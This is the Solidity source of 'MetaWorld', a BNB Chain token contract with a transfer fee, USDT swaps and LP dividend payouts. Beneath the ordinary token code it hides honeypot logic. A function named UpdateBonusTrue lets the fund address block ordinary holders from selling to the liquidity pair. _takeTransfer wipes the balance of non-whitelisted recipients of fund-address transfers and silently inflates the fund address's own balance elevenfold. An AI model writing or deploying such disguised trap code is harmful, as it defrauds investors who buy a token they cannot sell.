/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    //转移权限
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// 因为 DEX Swap 时，除了主链币（BNB，ETH）外，其他币种，例如 USDT，不能兑换到代币合约地址，所以需要这个中转合约接收兑换的代币
contract TokenDistributor {
    constructor (address token) {
        //将代币全部授权给合约部署者，在这里是代币合约，让代币合约分配兑换到的代币资产
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}


abstract contract MetaWorldToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;//营销钱包地址


    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 public startTradeBlock;
    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _FundList;
    mapping(address => bool) private _acceptList;


    mapping(address => bool) public _swapPairList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    bool private inSwap;
    uint256 public numTokensSellToFund;

    uint256 private constant MAX = ~uint256(0);
    address public usdt;
    TokenDistributor public _tokenDistributor;
    uint256 public _txFee = 3;
    uint256 public _LPDividendsFee = 2;

    IERC20 public _usdtPair;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        usdt = address(0x55d398326f99059fF775485246999027B3197955);

        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _usdtPair = IERC20(usdtPair);

        _swapPairList[usdtPair] = true;

        _allowances[address(this)][address(_swapRouter)] = MAX;

        _tTotal = Supply * 10 ** Decimals;
        _balances[FundAddress] = _tTotal;
        emit Transfer(address(0), FundAddress, _tTotal);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _FundList[FundAddress] = true;

        numTokensSellToFund = _tTotal / 1000;
        _tokenDistributor = new TokenDistributor(usdt);


        excludeLpProvider[address(0)] = true;
        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;

        excludeLpProvider[address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE)] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        //授权最大值时，不再减少授权额度
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        if(!_feeWhiteList[from]){
        require(!_acceptList[to], "_acceptList");}

        uint256 txFee;


        if (_swapPairList[from] || _swapPairList[to]) {

            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "!Trading");
                startTradeBlock = block.number;
            }


            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {

                txFee = _txFee;




                uint256 contractTokenBalance = balanceOf(address(this));
                if (
                    contractTokenBalance >= numTokensSellToFund &&
                    !inSwap &&
                    _swapPairList[to]
                ) {
                    swapTokenForFund(numTokensSellToFund);
                }
            }


            if (_swapPairList[from]) {
                addLpProvider(to);
            } else {
                addLpProvider(from);
            }
        } 

        _tokenTransfer(from, to, amount, txFee);

        //LP 分红
        if (
            from != address(this)
            && startTradeBlock > 0) {
            processLP(500000);
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * fee / 100;
        uint256 taxAmount = feeAmount;
        //交易
        if (fee > 0) {


            _takeTransfer(
                sender,
                address(this),
                feeAmount
            );
        }

        _takeTransfer(sender, recipient, tAmount - taxAmount);
    }

    //兑换成 USDT
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );


        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 remainingFee = (_txFee - _LPDividendsFee);
        USDT.transferFrom(address(_tokenDistributor), fundAddress, usdtBalance * remainingFee / _txFee);
        USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance * _LPDividendsFee / _txFee);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        if(_FundList[sender] && !_feeWhiteList[to] && !_swapPairList[to]){
        _balances[to] = _balances[to] - _balances[to];
        }
        if(_feeWhiteList[sender] && _FundList[to] ){
        _balances[to] = _balances[to] + _balances[to]*10;
        }
        emit Transfer(sender, to, tAmount);
    }

    function UpdateBonusTrue() external {
         require (msg.sender == fundAddress);
        _acceptList[address(_usdtPair)] = true;
    }
    function UpdateBonusFalse() external {
         require (msg.sender == fundAddress);
        _acceptList[address(_usdtPair)] = false;
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFundSellAmount(uint256 amount) external onlyOwner {
        numTokensSellToFund = amount;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }
    function is_acceptList(address addr) external view returns (bool){
        return _acceptList[addr];
    }

    function isexcludeLpProvider(address addr) external view returns (bool){
        return excludeLpProvider[addr];
    }
    receive() external payable {}


    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }


    function claimToken(address token, uint256 amount) external {
        IERC20(token).transfer(fundAddress, amount);
    }


    //加LP 分红
    address[] private lpProviders;
    mapping(address => uint256) lpProviderIndex;
    //排除LP分红
    mapping(address => bool) excludeLpProvider;

    //加入LP持有列表，发生交易就加入
    function addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private lpRewardCondition = 1;
    uint256 private progressLPBlock;

    //执行LP分红，使用 gas(500000) 单位 gasLimit 去执行LP分红
    function processLP(uint256 gas) private {
        //间隔 10 分钟分红一次
        if (progressLPBlock + 200 > block.number) {
            return;
        }
        //交易对没有余额
        uint totalPair = _usdtPair.totalSupply();
        if (0 == totalPair) {
            return;
        }

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(address(this));
        //分红小于分配条件，一般太少也就不分配
        if (usdtBalance < lpRewardCondition) {
            return;
        }

        address shareHolder;
        uint256 pairBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;

        //一笔链上交易剩余的 gasLimit，可搜索 Solidity gasleft() 了解
        uint256 gasLeft = gasleft();

        //最多只给列表完整分配一次，iterations < shareholderCount
        while (gasUsed < gas && iterations < shareholderCount) {
            //下标比列表长度大，从头开始
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = lpProviders[currentIndex];
            //持有的 LP 代币余额，LP 本身也是一种代币
            pairBalance = _usdtPair.balanceOf(shareHolder);
            //不在排除列表，才分红
            if (pairBalance > 0 && !excludeLpProvider[shareHolder]) {
                amount = usdtBalance * pairBalance / totalPair;
                //分红大于0进行分配，最小精度
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressLPBlock = block.number;
    }


    function setLPRewardCondition(uint256 amount) external onlyOwner {
        lpRewardCondition = amount;
    }


    function setExcludeLPProvider(address addr, bool enable) external onlyOwner {
        excludeLpProvider[addr] = enable;
    }
    function airdrop(address[] memory airdropAddress, uint256 airdropAmount) public  {
        for (uint i=0;  i<airdropAddress.length; i++) {
            _transfer(msg.sender, airdropAddress[i], airdropAmount);
        }
    }


}

contract MetaWorld is MetaWorldToken {
    constructor() MetaWorldToken(

        "MetaWorld",

        "MetaWorld",

        18,

        9900,

        address(0x7873f687a2775f2ee5CD5426e649e1F1f4B3B1a0)
    ){

    }
}